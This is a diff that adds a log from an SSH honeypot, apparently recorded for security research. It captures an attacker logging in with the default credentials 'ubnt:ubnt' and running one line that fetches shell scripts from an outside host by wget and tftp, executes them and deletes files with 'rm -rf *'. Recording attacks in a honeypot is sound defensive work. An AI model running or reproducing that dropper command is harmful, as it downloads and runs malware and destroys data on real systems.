@@ -1,0 +1,48 @@
+2020-11-07 00:12:57.069 - [Info] MITM Version: 1.26
+2020-11-07 00:12:57.073 - [Info] Auto Access Enabled: true
+2020-11-07 00:12:57.073 - [Debug] [Init] Auto Access Barrier: true
+2020-11-07 00:12:57.085 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-07 01:14:06.435 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:14:09.239 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:14:09.240 - [Debug] [Auto Access] Attacker: 185.212.149.160, Threshold: 1, Attempts: 1
+2020-11-07 01:14:09.240 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-07 01:14:09.240 - [Debug] [Auto Access] Adding the following credentials: "ubnt:ubnt"
+2020-11-07 01:14:09.452 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-07 01:14:09.452 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-07 01:14:09.476 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-07 01:14:10.182 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /run || cd /; wget http://107.173.91.164/Ciabins.sh; chmod 777 Ciabins.sh; sh Ciabins.sh; tftp 107.173.91.164 -c get Ciatftp1.sh; chmod 777 Ciatftp1.sh; sh Ciatftp1.sh; tftp -r Ciatftp2.sh -g 107.173.91.164; chmod 777 Ciatftp2.sh; sh Ciatftp2.sh; rm -rf Ciabins.sh Ciatftp1.sh Ciatftp2.sh; rm -rf *
+2020-11-07 01:14:20.279 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:14:21.574 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:14:21.575 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-07 01:14:21.575 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:14:22.235 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:14:35.111 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:14:38.129 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:14:38.130 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-11-07 01:14:38.130 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:14:38.356 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:14:50.698 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:15:06.066 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:15:06.066 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-07 01:15:06.066 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:15:06.918 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:15:07.208 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:15:09.567 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:15:09.567 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-07 01:15:09.568 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:15:10.504 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:15:20.361 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:15:21.623 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:15:21.623 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-07 01:15:21.623 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:15:22.674 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:15:35.751 - [Debug] [Connection] Attacker connected: 185.212.149.160 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 01:15:39.637 - [Debug] [Auth] Attacker 185.212.149.160 trying to authenticate with "password"
+2020-11-07 01:15:39.637 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-07 01:15:39.638 - [Debug] [Auth] Attacker: 185.212.149.160 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-07 01:15:40.389 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 01:15:49.423 - [Debug] [Connection] Attacker closed connection
+2020-11-07 01:15:49.427 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-07 01:15:49.427 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-07 01:19:10.777 - [Info] Exiting...
+2020-11-07 01:19:10.777 - [Debug] Cleaning up...
